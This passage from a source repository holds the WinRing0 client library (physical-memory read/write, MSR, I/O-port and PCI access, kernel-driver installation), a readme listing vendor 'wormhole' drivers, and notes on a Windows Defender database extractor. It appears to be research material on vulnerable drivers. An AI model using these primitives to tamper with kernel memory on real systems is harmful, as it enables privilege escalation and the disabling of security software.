	if(sizeof(DWORD_PTR) == 4)
	{
		inBuf.Address.HighPart = 0;
		inBuf.Address.LowPart = (DWORD)address;
	}
	else
	{
		inBuf.Address.QuadPart = address;
	}

	inBuf.UnitSize = unitSize;
	inBuf.Count = count;
	size = inBuf.UnitSize * inBuf.Count;

    result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_READ_MEMORY,
                        &inBuf,
                        sizeof(OLS_READ_MEMORY_INPUT),
                        buffer,
                        size,
                        &returnedLength,
                        NULL
                        );

    if(result && returnedLength == size)
	{
		return count * unitSize;
	}
	else
	{
		return 0;
	}
}

DWORD WINAPI WritePhysicalMemory(DWORD_PTR address, PBYTE buffer, DWORD count, DWORD unitSize)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if(buffer == NULL)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	size = 0;
	DWORD	rCode = 0;
	OLS_WRITE_MEMORY_INPUT *inBuf;

	size = offsetof(OLS_WRITE_MEMORY_INPUT, Data) + count * unitSize;
	inBuf = (OLS_WRITE_MEMORY_INPUT*)malloc(size);
	if(sizeof(DWORD_PTR) == 4)
	{
		inBuf->Address.HighPart = 0;
		inBuf->Address.LowPart = (DWORD)address;
	}
	else
	{
		inBuf->Address.QuadPart = address;
	}
	inBuf->UnitSize = unitSize;
	inBuf->Count = count;
	memcpy(&inBuf->Data, buffer, count * unitSize);

    result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_WRITE_MEMORY,
                        inBuf,     
                        size,
                        NULL,
                        0,
                        &returnedLength,
                        NULL
                        );
    if(result)
	{
		rCode = count * unitSize;
	}
	else
	{
		rCode = 0;
	}

	free(inBuf);

	return rCode;
}
#endif

```

`source/WormholeDrivers/WINRING0/drv/DriverApi.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------
// for WinRing0 1.3.x

#pragma once

//-----------------------------------------------------------------------------
// Use Driver Must Be Initialize
//-----------------------------------------------------------------------------
BOOL Initialize(LPCTSTR DriverPath);

//-----------------------------------------------------------------------------
// Must Remove Before Application leave
//-----------------------------------------------------------------------------
BOOL Deinitialize();

//-----------------------------------------------------------------------------
// GetDriverVersion
//-----------------------------------------------------------------------------
DWORD // Device Driver Version, defined OLS_DRIVER_VERSION
WINAPI GetDriverVersion(
	PBYTE major,		// major version
	PBYTE minor,		// minor version
	PBYTE revision,		// revision
	PBYTE release		// release/build
);

//-----------------------------------------------------------------------------
// GetDriverType
//-----------------------------------------------------------------------------
DWORD // Device Driver Type, defined OLS_DRIVER_TYPE_****
WINAPI GetDriverType();

//-----------------------------------------------------------------------------
// InitializeOls
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI InitializeOls();

//-----------------------------------------------------------------------------
// DeinitializeOls
//-----------------------------------------------------------------------------
VOID WINAPI DeinitializeOls();

/******************************************************************************
**
** CPU
**
******************************************************************************/

//-----------------------------------------------------------------------------
// IsCpuid
//-----------------------------------------------------------------------------
BOOL // TRUE: support CPUID instruction, FALSE: not support CPUID instruction
WINAPI IsCpuid();

//-----------------------------------------------------------------------------
// IsMsr
//-----------------------------------------------------------------------------
BOOL // TRUE: support MSR(Model-Specific Register), FALSE: not support MSR
WINAPI IsMsr();

//-----------------------------------------------------------------------------
// IsTsc
//-----------------------------------------------------------------------------
BOOL // TRUE: support TSC(Time Stamp Counter), FALSE: not support TSC
WINAPI IsTsc();

//-----------------------------------------------------------------------------
// Rdmsr
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Rdmsr(
	DWORD index,					// MSR index
	PDWORD eax,						// bit  0-31
	PDWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// RdmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdmsrTx(
	DWORD index,					// MSR index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// RdmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdmsrPx(
	DWORD index,					// MSR index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Wrmsr
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Wrmsr(
	DWORD index,					// MSR index
	DWORD eax,						// bit  0-31
	DWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// WrmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WrmsrTx(
	DWORD index,					// MSR index
	DWORD eax,						// bit  0-31
	DWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// WrmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WrmsrPx(
	DWORD index,					// MSR index
	DWORD eax,						// bit  0-31
	DWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Rdpmc
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Rdpmc(
	DWORD index,					// PMC index
	PDWORD eax,						// bit  0-31
	PDWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// RdmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdpmcTx(
	DWORD index,					// PMC index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// RdmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdpmcPx(
	DWORD index,					// PMC index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Cpuid
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Cpuid(
	DWORD index,					// CPUID index
	PDWORD eax,
	PDWORD ebx,
	PDWORD ecx,
	PDWORD edx
);

//-----------------------------------------------------------------------------
// CpuidTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI CpuidTx(
	DWORD index,					// CPUID index
	PDWORD eax,
	PDWORD ebx,
	PDWORD ecx,
	PDWORD edx,
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// CpuidPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI CpuidPx(
	DWORD index,					// CPUID index
	PDWORD eax,
	PDWORD ebx,
	PDWORD ecx,
	PDWORD edx,
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Rdtsc
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Rdtsc(
	PDWORD eax,						// bit  0-31
	PDWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// RdmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdtscTx(
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// RdmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdtscPx(
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Hlt
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Hlt();

//-----------------------------------------------------------------------------
// HltTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI HltTx(
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// HltPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI HltTx(
	DWORD_PTR processAffinityMask
);

/******************************************************************************
**
** I/O
**
******************************************************************************/

//-----------------------------------------------------------------------------
// ReadIoPortByte
//-----------------------------------------------------------------------------
BYTE // Read Value
WINAPI ReadIoPortByte(
	WORD port			// I/O port address
);

//-----------------------------------------------------------------------------
// ReadIoPortWord
//-----------------------------------------------------------------------------
WORD // Read Value
WINAPI ReadIoPortWord(
	WORD port			// I/O port address
);

//-----------------------------------------------------------------------------
// ReadIoPortDword
//-----------------------------------------------------------------------------
DWORD // Read Value
WINAPI ReadIoPortDword(
	WORD port			// I/O port address
);

//-----------------------------------------------------------------------------
// ReadIoPortByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadIoPortByteEx(
	WORD port,			// I/O port address
	PBYTE value			// Read Value
);
//-----------------------------------------------------------------------------
// ReadIoPortWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadIoPortWordEx(
	WORD port,			// I/O port address
	PWORD value			// Read Value
);
//-----------------------------------------------------------------------------
// ReadIoPortDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadIoPortDwordEx(
	WORD port,			// I/O port address
	PDWORD value		// Read Value
);

//-----------------------------------------------------------------------------
// WriteIoPortByte
//-----------------------------------------------------------------------------
VOID
WINAPI WriteIoPortByte(
	WORD port,			// I/O port address
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WriteIoPortDword
//-----------------------------------------------------------------------------
VOID
WINAPI WriteIoPortDword(
	WORD port,			// I/O port address
	DWORD value			// Write Value
);


//-----------------------------------------------------------------------------
// WriteIoPortWord
//-----------------------------------------------------------------------------
VOID 
WINAPI WriteIoPortWord(
	WORD port,			// I/O port address
	WORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WriteIoPortByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WriteIoPortByteEx(
	WORD port,			// I/O port address
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WriteIoPortWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WriteIoPortWordEx(
	WORD port,			// I/O port address
	WORD value			// Write Value
);


//-----------------------------------------------------------------------------
// WriteIoPortDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WriteIoPortDwordEx(
	WORD port,			// I/O port address
	DWORD value			// Write Value
);

/******************************************************************************
**
** PCI
**
******************************************************************************/
// pciAddress
//  0- 2: Function Number
//  3- 7: Device Number
//  8-15: PCI Bus Number
// 16-31: Reserved
// 0xFFFFFFFF : Error

//-----------------------------------------------------------------------------
// SetPciMaxBusNo
//-----------------------------------------------------------------------------
VOID
WINAPI SetPciMaxBusIndex(
	BYTE max			// Max PCI Bus to Scan
);

//-----------------------------------------------------------------------------
// ReadPciConfigByte
//-----------------------------------------------------------------------------
BYTE // Read Value
WINAPI ReadPciConfigByte(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress		// Configuration Address 0-255
);

//-----------------------------------------------------------------------------
// ReadPciConfigWord
//-----------------------------------------------------------------------------
WORD // Read Value
WINAPI ReadPciConfigWord(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress		// Configuration Address 0-255
);

//-----------------------------------------------------------------------------
// ReadPciConfigDword
//-----------------------------------------------------------------------------
DWORD // Read Value
WINAPI ReadPciConfigDword(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress		// Configuration Address 0-255
);

//-----------------------------------------------------------------------------
// ReadPciConfigByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadPciConfigByteEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	PBYTE value			// Read Value
);

//-----------------------------------------------------------------------------
// ReadPciConfigWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadPciConfigWordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	PWORD value			// Read Value
);

//-----------------------------------------------------------------------------
// ReadPciConfigDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadPciConfigDwordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	PDWORD value		// Read Value
);

//-----------------------------------------------------------------------------
// WritePciConfigByte
//-----------------------------------------------------------------------------
VOID
WINAPI WritePciConfigByte(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress,	// Configuration Address 0-255
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigWord
//-----------------------------------------------------------------------------
VOID
WINAPI WritePciConfigWord(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress,	// Configuration Address 0-255
	WORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigDword
//-----------------------------------------------------------------------------
VOID
WINAPI WritePciConfigDword(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress,	// Configuration Address 0-255
	DWORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WritePciConfigByteEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WritePciConfigWordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	WORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WritePciConfigDwordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	DWORD value			// Write Value
);

//-----------------------------------------------------------------------------
// FindPciDeviceById
//-----------------------------------------------------------------------------
DWORD // pciAddress, 0xFFFFFFFF: failure
WINAPI FindPciDeviceById(
	WORD vendorId,		// Vendor ID
	WORD deviceId,		// Device ID
	BYTE index			// Index
);

//-----------------------------------------------------------------------------
// FindPciDeviceByClass
//-----------------------------------------------------------------------------
DWORD // pciAddress, 0xFFFFFFFF: failure
WINAPI FindPciDeviceByClass(
	BYTE baseClass,		// Base Class
	BYTE subClass,		// Sub Class
	BYTE programIf,		// Program Interface
	BYTE index			// Index
);

/******************************************************************************
**
** Memory (Special API)
**
******************************************************************************/

#ifdef _PHYSICAL_MEMORY_SUPPORT
//-----------------------------------------------------------------------------
// ReadDmiMemory
//-----------------------------------------------------------------------------
DWORD // Read size(byte), 0: failure
WINAPI ReadDmiMemory(
	PBYTE buffer,		// Buffer
	DWORD count,		// Count
	DWORD unitSize		// Unit Size (BYTE, WORD, DWORD)
);

//-----------------------------------------------------------------------------
// ReadPhysicalMemory
//-----------------------------------------------------------------------------
DWORD // Read size(byte), 0: failure
WINAPI ReadPhysicalMemory(
	DWORD_PTR address,	// Physical Memory Address
	PBYTE buffer,		// Buffer
	DWORD count,		// Count
	DWORD unitSize		// Unit Size (BYTE, WORD, DWORD)
);

//-----------------------------------------------------------------------------
// WritePhysicalMemory
//-----------------------------------------------------------------------------
DWORD // Write size(byte), 0: failure
WINAPI WritePhysicalMemory(
	DWORD_PTR address,	// Physical Memory Address
	PBYTE buffer,		// Buffer
	DWORD count,		// Count
	DWORD unitSize		// Unit Size (BYTE, WORD, DWORD)
);
#endif

```

`source/WormholeDrivers/WINRING0/drv/DriverIoCtl.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#pragma once

//-----------------------------------------------------------------------------
//
// The Device type codes form 32768 to 65535 are for customer use.
//
//-----------------------------------------------------------------------------

#define OLS_TYPE 40000

//-----------------------------------------------------------------------------
//
// Version Information
//
//-----------------------------------------------------------------------------

#define OLS_DRIVER_ID							_T("WinRing0_1_2_0")

#define OLS_DRIVER_MAJOR_VERSION				1
#define OLS_DRIVER_MINOR_VERSION				2
#define OLS_DRIVER_REVISION						0
#define OLS_DRIVER_RELESE						5

#define OLS_DRIVER_VERSION \
	((OLS_DRIVER_MAJOR_VERSION << 24) | (OLS_DRIVER_MINOR_VERSION << 16) \
	| (OLS_DRIVER_REVISION << 8) | OLS_DRIVER_RELESE) 

//-----------------------------------------------------------------------------
//
// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
//
//-----------------------------------------------------------------------------
#define IOCTL_OLS_GET_DRIVER_VERSION \
	CTL_CODE(OLS_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_GET_REFCOUNT \
	CTL_CODE(OLS_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_MSR \
	CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_WRITE_MSR \
	CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_PMC \
	CTL_CODE(OLS_TYPE, 0x823, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_HALT \
	CTL_CODE(OLS_TYPE, 0x824, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_IO_PORT \
	CTL_CODE(OLS_TYPE, 0x831, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT \
	CTL_CODE(OLS_TYPE, 0x832, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_IO_PORT_BYTE \
	CTL_CODE(OLS_TYPE, 0x833, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_READ_IO_PORT_WORD \
	CTL_CODE(OLS_TYPE, 0x834, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_READ_IO_PORT_DWORD \
	CTL_CODE(OLS_TYPE, 0x835, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT_BYTE \
	CTL_CODE(OLS_TYPE, 0x836, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT_WORD \
	CTL_CODE(OLS_TYPE, 0x837, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT_DWORD \
	CTL_CODE(OLS_TYPE, 0x838, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_MEMORY \
	CTL_CODE(OLS_TYPE, 0x841, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_MEMORY \
	CTL_CODE(OLS_TYPE, 0x842, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_PCI_CONFIG \
	CTL_CODE(OLS_TYPE, 0x851, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_PCI_CONFIG \
	CTL_CODE(OLS_TYPE, 0x852, METHOD_BUFFERED, FILE_WRITE_ACCESS)

//-----------------------------------------------------------------------------
//
// PCI Error Code
//
//-----------------------------------------------------------------------------

#define OLS_ERROR_PCI_BUS_NOT_EXIST		(0xE0000001L)
#define OLS_ERROR_PCI_NO_DEVICE			(0xE0000002L)
#define OLS_ERROR_PCI_WRITE_CONFIG		(0xE0000003L)
#define OLS_ERROR_PCI_READ_CONFIG		(0xE0000004L)

//-----------------------------------------------------------------------------
//
// Support Macros
//
//-----------------------------------------------------------------------------

// Bus Number, Device Number and Function Number to PCI Device Address
#define PciBusDevFunc(Bus, Dev, Func)	((Bus&0xFF)<<8) | ((Dev&0x1F)<<3) | (Func&7)
// PCI Device Address to Bus Number
#define PciGetBus(address)				((address>>8) & 0xFF)
// PCI Device Address to Device Number
#define PciGetDev(address)				((address>>3) & 0x1F)
// PCI Device Address to Function Number
#define PciGetFunc(address)				(address&7)

//-----------------------------------------------------------------------------
//
// Typedef Struct
//
//-----------------------------------------------------------------------------

typedef unsigned char UCHAR;
typedef unsigned short USHORT;
typedef unsigned long ULONG;

#include<winnt.h>

#pragma pack(push,4)

typedef struct  _OLS_WRITE_MSR_INPUT {
	ULONG		Register;
	ULARGE_INTEGER	Value;
}   OLS_WRITE_MSR_INPUT;

typedef struct  _OLS_WRITE_IO_PORT_INPUT {
	ULONG	PortNumber; 
	union {
		ULONG   LongData;
		USHORT  ShortData;
		UCHAR   CharData;
	};
}   OLS_WRITE_IO_PORT_INPUT;

typedef struct  _OLS_READ_PCI_CONFIG_INPUT {
	ULONG PciAddress;
	ULONG PciOffset;
}   OLS_READ_PCI_CONFIG_INPUT;

typedef struct  _OLS_WRITE_PCI_CONFIG_INPUT {
	ULONG PciAddress;
	ULONG PciOffset;
	UCHAR Data[1];
}   OLS_WRITE_PCI_CONFIG_INPUT;

typedef LARGE_INTEGER PHYSICAL_ADDRESS;

typedef struct  _OLS_READ_MEMORY_INPUT {
	PHYSICAL_ADDRESS Address;
	ULONG UnitSize;
	ULONG Count;
}   OLS_READ_MEMORY_INPUT;

typedef struct  _OLS_WRITE_MEMORY_INPUT {
	PHYSICAL_ADDRESS Address;	 
	ULONG UnitSize;
	ULONG Count;
	UCHAR Data[1];
}   OLS_WRITE_MEMORY_INPUT;

#pragma pack(pop)

```

`source/WormholeDrivers/WINRING0/drv/DriverManage.c`:

```c
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include<Windows.h>
#include<tchar.h>
#include "DriverApi.h"

//Driver Id
#define OLS_DRIVER_ID		_T("WinRing0_1_2_0")
//Diever Show Name
#define DRIVER_ID			_T("WinRing0")
//The main Handle
extern HANDLE gHandle;
//-----------------------------------------------------------------------------
//
// Initialize
//
//-----------------------------------------------------------------------------

//please use absolute file path
BOOL Initialize(LPCTSTR DriverPath)
{
	//32 bit system use 32 bit dirver
	//64 bit system use 64 bit dirver
	//BOOL bIsWow64 = FALSE;
	//IsWow64Process(GetCurrentProcess(), &bIsWow64);
	//if (bIsWow64)InstallDriver(DRIVER_ID, DRIVER_x64);
	//else InstallDriver(DRIVER_ID, DRIVER_x86);
	if (InstallDriver(DRIVER_ID, DriverPath))
		if (StartDriver(DRIVER_ID))
			if(OpenDriver())return TRUE;
	return FALSE;
}

//-----------------------------------------------------------------------------
//
// Deinitialize
//
//-----------------------------------------------------------------------------

BOOL Deinitialize()
{
	StopDriver(DRIVER_ID);
	RemoveDriver(DRIVER_ID);
	return TRUE;
}


//-----------------------------------------------------------------------------
//
// Open Driver
//
//-----------------------------------------------------------------------------

BOOL OpenDriver()
{
	gHandle = CreateFile(
		_T("\\\\.\\") OLS_DRIVER_ID,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	int error = GetLastError();

	if (gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	return TRUE;
}


//-----------------------------------------------------------------------------
//
// Install Driver
//
//-----------------------------------------------------------------------------

BOOL InstallDriver(LPCTSTR DriverId, LPCTSTR DriverPath)
{
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE	hService = NULL;
	BOOL        rCode = FALSE;
	DWORD		error = NO_ERROR;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}

	hService = CreateService(hSCManager,
		DriverId,
		DriverId,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		DriverPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
		);

	if (hService == NULL)
	{
		error = GetLastError();
		if (error == ERROR_SERVICE_EXISTS)
		{
			rCode = TRUE;
		}
	}
	else
	{
		rCode = TRUE;
		CloseServiceHandle(hService);
	}
	CloseServiceHandle(hSCManager);
	return rCode;
}


//-----------------------------------------------------------------------------
//
// Remove Driver
//
//-----------------------------------------------------------------------------

BOOL RemoveDriver(LPCTSTR DriverId)
{
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE   hService = NULL;
	BOOL        rCode = FALSE;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}

	hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);
	if (hService == NULL)
	{
		rCode = TRUE;
	}
	else
	{
		rCode = DeleteService(hService);
		CloseServiceHandle(hService);
	}
	CloseServiceHandle(hSCManager);
	return rCode;
}


//-----------------------------------------------------------------------------
//
// Start Driver
//
//-----------------------------------------------------------------------------

BOOL StartDriver(LPCTSTR DriverId)
{
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE	hService = NULL;
	BOOL		rCode = FALSE;
	DWORD		error = NO_ERROR;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}

	hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);

	if (hService != NULL)
	{
		if (!StartService(hService, 0, NULL))
		{
			if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
			{
				rCode = TRUE;
			}
		}
		else
		{
			rCode = TRUE;
		}
		CloseServiceHandle(hService);
	}
	CloseServiceHandle(hSCManager);
	return rCode;
}


//-----------------------------------------------------------------------------
//
// Stop Driver
//
//-----------------------------------------------------------------------------

BOOL StopDriver(LPCTSTR DriverId)
{
	SC_HANDLE hSCManager = NULL;
	SC_HANDLE		hService = NULL;
	BOOL			rCode = FALSE;
	SERVICE_STATUS	serviceStatus;
	DWORD		error = NO_ERROR;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}

	hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);

	if (hService != NULL)
	{
		rCode = ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
		CloseServiceHandle(hService);
	}
	CloseServiceHandle(hSCManager);
	return rCode;
}

```

`source/WormholeDrivers/readme.txt`:

```txt
Collection of "wormhole" open source drivers widely used by hardware vendors sometimes in unmodified state.

MAPMEM   - NTDDK 3.51 example from 1993, multiple usage, noticable usage by Gigabyte, SuperMicro
PHYMEM   - by akui, multiple usage, noticable usage by Realtek, SuperMicro
WINIO    - by Yariv Kaplan, multiple usage, ENETECH I/O drivers main source of inspiration
WINRING0 - by hiyohiyo, multiple usage, literally everywhere

(c) drivers authors
```

`source/wdextract/README.md`:

```md

# wdextract
## Extract Windows Defender database from vdm files and unpack it

Based on original PowerShell script https://gist.github.com/mattifestation/3af5a472e11b7e135273e71cb5fed866

Rewrote to C++ because it is much faster than any script.

### Usage wdextract "vdm filename" 

+ This program distributed as-is;
+ Uses ZLIB Data Compression Library (https://github.com/madler/zlib);
+ Built with MSVC 2017 with SDK 17763.

```

`source/wdextract/wdextract.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.539
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "wdextract", "wdextract\wdextract.vcxproj", "{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Debug|x64.ActiveCfg = Debug|x64
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Debug|x64.Build.0 = Debug|x64
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Debug|x86.ActiveCfg = Debug|Win32
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Debug|x86.Build.0 = Debug|Win32
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Release|x64.ActiveCfg = Release|x64
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Release|x64.Build.0 = Release|x64
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Release|x86.ActiveCfg = Release|Win32
		{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {DB1C4BA6-54B6-4E86-9651-1D868FC12E74}
	EndGlobalSection
EndGlobal

```

`source/wdextract/wdextract/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`source/wdextract/wdextract/pch.h`:

```h
// Tips for Getting Started: 
